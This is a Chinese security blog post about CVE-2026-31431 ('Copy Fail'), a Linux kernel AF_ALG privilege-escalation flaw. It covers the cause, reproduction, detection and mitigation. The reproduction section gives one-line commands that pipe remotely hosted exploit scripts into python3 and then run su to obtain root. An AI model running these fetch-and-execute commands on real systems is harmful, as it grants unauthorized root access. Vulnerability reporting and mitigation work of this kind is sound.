---
title: AI 揪出 copyfail 潜伏在Linux近九年的提权小偷！
url: https://mp.weixin.qq.com/s/JKIHlIS-04nRoCCmdyc7mA
source: Doonsec's feed
date: 2026-05-02
fetch_date: 2026-05-03T05:24:04.874903
---

# AI 揪出 copyfail 潜伏在Linux近九年的提权小偷！

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/VugQCN2riaR2Igw65RibMGXmhFRWzq3cxNoPBOX0a73a7QeUw90N8UCZArq1EICwtjK9FmCKZgFicn1gzGcHo5pTn58L0a3fbb5Yo5MMrmtN2Y/0?wx_fmt=jpeg)

# AI 揪出 copyfail 潜伏在Linux近九年的提权小偷！

原创

爱捡垃圾的小男孩
爱捡垃圾的小男孩

一个不正经的黑客

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Nia2FmsibG0xVI2rqw9gDJZTuQ4DVxtN0pZMevNt7hXZwvWOxic1SibajuLjYYAR1saM0zgK9v7rOLrQDjcicmXkXiaYsDYwPXqajdg0C36U8XcCs/640?from=appmsg)

点击上方

蓝字

轻松关注~

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6QrYsjft1eEaVqlNvib4YlZmXfqn01zbVhyAaVslIdt1YcGLUsbLsWcWkicic5PCfAIkibyVq5H4fdice70uBS8JticnmtFIqPjGFdbKoicAW5caPY/640?from=appmsg)

## 漏洞简介

Xint Code 披露了 CVE-2026-31431，这是一个身份验证临时写入漏洞，利用 AF\_ALG + splice() 函数链式调用，导致 4 字节的页面缓存写入。

一个 732 字节的 PoC 代码可以在 Ubuntu、Amazon Linux、RHEL 和 SUSE 系统上获取 root 权限。

Copy Fail 仅需要一个非特权本地用户帐户——无需网络访问权限、内核调试功能或预装原语。

内核加密 API ( `AF_ALG`) 在几乎所有主流发行版的默认配置中都已启用，因此 2017 年至今的所有补丁窗口都已开箱即用。

![Pasted image 20260502121636](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR0zagMrDzwHm939uULj6nunJUl1KOHBxrkVNAAXPwvH9pu1vh1xGvQh9XibsWWurC1uNfLqJibm1fT1s6T1BGDABiclOn7qCdBp48/640?wx_fmt=png&from=appmsg)

## 漏洞原理

该缺陷存在于 Linux 内核的 algif\_aead 代码中，该代码用于 AF\_ALG 加密套接字接口。2017 年，为了优化性能，内核将 AEAD 操作“原地”执行，方法是将源缓冲区和目标缓冲区设置为同一内存区域。

当一个可读文件被插入到 AF\_ALG 套接字中时，内核传递的是指向该文件页面缓存的引用，而不是复制文件。

由于源缓冲区和目标缓冲区是共享的，这些通常只读的页面缓存变得可写。

身份验证算法（IPsec 用于扩展序列号）随后将目标缓冲区用作临时暂存空间，并在预期输出边界之外写入四个字节。

该写入操作直接进入拼接文件的页面缓存。

内核不会将该页面标记为脏页，因此磁盘上的文件未发生更改，文件完整性检查仍然通过。

最后，攻击者执行了一个内存内容已被修改的 setuid 二进制文件（例如，通过修改缓存的 /etc/passwd 或 /usr/bin/su 数据），从而获得 root shell 权限。

这个漏洞源于多年来几项看似合理的系统设计变更相互作用的结果，这些变更共同构成了一条强大的提权路径，而这条路径在近十年间一直未被察觉。

## 复现过程

1.确认系统版本： Ubuntu 24.04 LTS

2.创建低权限用户

3.最终，非常简单流畅地实现了提权目标

```
cat /etc/*release
uname -a
```

![Pasted image 20260430221409](https://mmbiz.qpic.cn/sz_mmbiz_png/VugQCN2riaR12Uoa3ia0LZzXsneTyZxPJjmWPvabfkScWFAYm563DS5MRUm4qhZU83tE7slwKd2IyMU5m9KRw14z5AZa9exyCuxlX8sRYAG4I/640?wx_fmt=png&from=appmsg)![Pasted image 20260430221859](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR1BJM2S6UwOLUwbicZhFRIVYJgOEsv9UElSzIHicaUL8dkY0A8BfFJ6FlaUs6ibSRarTlWBhia7gd3QicxHEEgXnPtGHEKsqqnPJTRQ/640?wx_fmt=png&from=appmsg)

```
# 创建低权限用户
sudo adduser lowuser
```

![Pasted image 20260430221731](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR1IcehEDJvqbAvuiaSczZAXWOOCZO5icGTUaXTvcJqCBKaLiaTBplTY8EdRxscE7bxgVkL5AowY7NG9bB9r31305oUtQw3TkibXreg/640?wx_fmt=png&from=appmsg)

```
curl https://copy.fail/exp | python3 && su
```

![Pasted image 20260430222006](https://mmbiz.qpic.cn/sz_mmbiz_png/VugQCN2riaR2V1LbWrXzic3QU2LcTwVickKYTywKAvUH0cNKSyaYubzSF6zmXB88LThvwibvJZWF6mwWQxTqrf9gUrbt31XErOgfYy5Oicvv5yl0/640?wx_fmt=png&from=appmsg)

## 利用优化

https://copy.fail/exp 的exp兼容性不是特别好，下面这两种情况可能会失败

1. 3.10 版本之前的操作系统不包含 splice() 函数。

2. 不同系统su 默认路径不同

![Pasted image 20260502123018](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR0LLicsFD4wv8H8gicdQhw4tDGckDibE9MjpJEREgmV8W7uOQ3eRIzIm2iaDt7d3yBiaHjcCwI86qfcEG1oBOa3qTyM7h8MULzvD4tk/640?wx_fmt=png&from=appmsg)

下面给出快速利用的解决脚本

```
curl https://raw.githubusercontent.com/slaptat/copyFail30/refs/heads/main/copyFail30.py | python3 && su

# 国内加速
curl https://img.rad0.indevs.in/https://github.com/slaptat/copyFail30/blob/main/copyFail30.py | python3 && su
```

![Pasted image 20260502123146](https://mmbiz.qpic.cn/sz_mmbiz_png/VugQCN2riaR2MJK4EDFHzefQTuCWwxlu430ogwdib0HibicuNrb5XZU1gSfqwtEKI1O2KW0fsjC80mlSjPP3lhyJ7pDgQ71QaM6wKqHughNCXNs/640?wx_fmt=png&from=appmsg)

## 注意事项

https://github.com/theori-io/copy-fail-CVE-2026-31431/issues 中有网友提到：

如果你先前已经运行过上述exploit脚本，那么su内存映像已遭到破坏，除非重启，要不然就相当留了一个提权后门程序。

![Pasted image 20260502132541](https://mmbiz.qpic.cn/sz_mmbiz_png/VugQCN2riaR1txtuzEHrSuLk5gibs5lnic1lFKLwhnryyruW61ic2KziaBrUsib4ZYVuHznql8lbdiaEs5CczWyWf6jKiam5V7w1ib1kshZHXhyzgIGk/640?wx_fmt=png&from=appmsg)

su 正常执行的情况是提示输入密码的![Pasted image 20260502132838](https://mmbiz.qpic.cn/sz_mmbiz_png/VugQCN2riaR22vXuicZcK1HLiaWib23Ribib0xskc6thHgiacYuDrJps18iaqMsPGibY9ia4SMKjVobR6HkyAnFtIcOurTk7wcykIbXiapSvuub2jr7QUw/640?wx_fmt=png&from=appmsg)su 被exp破坏之后，因为二进制内存映像已经被替换为shellcode ，所以相当于su是一个ROOT后门了。![Pasted image 20260502132920](https://mmbiz.qpic.cn/sz_mmbiz_png/VugQCN2riaR3t8hJTfI8nAF4wntiaiaLfJJVfzGPgEMCSoYWkY3IN48gKdfYMRZkBYfmYprKozroY9oaL40OB8icY7CDia8BLthtdGiaKiaQJecibc8/640?wx_fmt=png&from=appmsg)不过经过测试，网友提供的办法可以在不重启情况下恢复su文件![Pasted image 20260502134151](https://mmbiz.qpic.cn/sz_mmbiz_png/VugQCN2riaR24PEeiaBNtKcribMTsjlyILWPpk8HO69AbdiaCAYU0KpVYfiavTtpNtK1uJ86oIb62llfOkA5CfoDjxXGSmONTjib1iaDUYHTVzfkqU/640?wx_fmt=png&from=appmsg)

```
python3 - <<'PY'
import os

paths = [
    "/usr/bin/su",
    "/bin/su",
]

page = os.sysconf("SC_PAGE_SIZE")

for path in paths:
    ifnot os.path.exists(path):
        print(f"[-] not found: {path}")
        continue

    ifnot os.path.isfile(path):
        print(f"[-] not a file: {path}")
        continue

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_CLOEXEC", 0))
        try:
            os.posix_fadvise(fd, 0, page, os.POSIX_FADV_DONTNEED)
            print(f"[+] fadvise DONTNEED success: {path}")
        finally:
            os.close(fd)
    except PermissionError as e:
        print(f"[-] permission denied: {path}: {e}")
    except AttributeError:
        print("[-] os.posix_fadvise not supported on this Python/platform")
        break
    except OSError as e:
        print(f"[-] failed: {path}: {e}")
PY
```

![Pasted image 20260502133910](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR2JkRgxxgkJNXqgWdHPaE04CZdpJ46GpwkUX1zWnALWg1OanoKneooBElZs8QfBXKHVnLSEu3qc83s3WEG2EsLlvt0xg0uOW9U/640?wx_fmt=png&from=appmsg)

## 漏洞披露

![Pasted image 20260502114705](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR0zJoeSVCiaAfqeEib8aWpuGSAo5gM2szHLGCibic6JwSMO04n2qthIyeEY2xBfvnsia2RkKO8BfRpJNHrt8jRALpTEYjRk496FwwlU/640?wx_fmt=png&from=appmsg)

## 手工检测

通过如下命令快速判断当前机器是否受影响

```
uname -r
```

![Pasted image 20260502121033](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR29tcX5ibSsvmyk9tVSWeoGNetSibApFQQDDSJiaLOMKTiaRUe44fibibsJ94r4PDRCya0Micue0aECqvjBwPcAic2OLVdO6MIn48pUtLE/640?wx_fmt=png&from=appmsg)

检查内核配置是否启用（推荐）

```
grep CONFIG_CRYPTO_USER_API_AEAD /boot/config-$(uname -r)
```

注意： 结果会出现以下三种情况：

CONFIG\_CRYPTO\_USER\_API\_AEAD=n    彻底关闭，不受影响，无需处理

CONFIG\_CRYPTO\_USER\_API\_AEAD=y    静态编译进内核，Ismod 查不到，但受影响，暂无缓解措施，只能升级内核（例如：RHEL/CentOS/Rocky Linux/AlmaLinux 8, 9, 10 三代产品）

CONFIG\_CRYPTO\_USER\_API\_AEAD=m   模块方式，Ismod 可查，加载就有风险，受影响，可通过缓解措施缓解

```
# 检查 AF_ALG AEAD 接口是否可加载：
modinfo algif_aead
```

![Pasted image 20260502121249](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR0jb2VTDMA24Sia35EpKCWBic9lAjnNPRDCHiavIGUMcx8K53V0dHvUWOMMY4brCic9Fh1DvDAGZ6xicNTwSw0hMficwdOoib3iaWu5yiaw/640?wx_fmt=png&from=appmsg)

进一步检查 AF\_ALG socket 是否可创建

```
python3 -c "import socket; socket.socket(38,5,0); print('VULNERABLE')"
```

![Pasted image 20260502134756](https://mmbiz.qpic.cn/sz_mmbiz_png/VugQCN2riaR0OkukKxaicZJ8icHxia3reEdjXOEJU5RADB1ibUkgLKNaUwDLvWv2wZyEodSDVibZiceM14eIbiaHonI1e146Fibbgx05syicwPKRrZVd4/640?wx_fmt=png&from=appmsg)

**如果系统运行的是 Linux 内核 4.14 或更高版本，并且安装了 algif\_aead 模块，则该系统可能存在安全漏洞。**

## 缓解措施

1.**禁用 algif\_aead 模块（Linux）：**

将该模块列入黑名单，防止其在下次启动时加载，然后从正在运行的内核中卸载它：

```
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif-aead.conf
rmmod algif_aead 2>/dev/null
```

确认该模块已不再加载

```
lsmod | grep algif_aead
```

如果结果为空，则表示该模块已卸载。
注意：如果任何正在运行的应用程序显式依赖于 AF\_ALG AEAD 操作，则可能会导致故障。请先在非生产环境中进行测试。

## 漏洞总结

![Pasted image 20260502135508](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR2Yhsy6ibXb0Joq9eRrarq3tGwHAZqDlOqFCrZibribHs8rn24vlZUYldRjyfzcvaHdlfoxry9PYBicIx01BrXuSf2DEdebu5q54go/640?wx_fmt=png&from=appmsg)

这个漏洞是人类顶尖安全研究员 x 人工智能（Xint Code）的产物。

当下，AI正在以学习、融合乃至超越人类顶尖安全研究员作为网络安全攻关的奋斗目标。

潘多拉魔盒已然开启，网络安全领域即将迎来 AI 引领群魔乱舞的全新时代！

我们这一代普通人正在做的、只能做的，都是在成为历史的见证者。

喜欢就关注哦

![](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR3eEk8P1fjmSXBUM8Usb7iaIM7EibcFDrjjgB0HhAgk50IV1hpjMG83mJ6n6fcI0saA1bLPtqSjmdAFOtvg0hFWiaRCw9bsonO6VM/640?wx_fmt=png&from=appmsg)

动动小手点个赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VugQCN2riaR1gkS6V5vQZtHzIvDhfEUfQbl6mEj8ZR...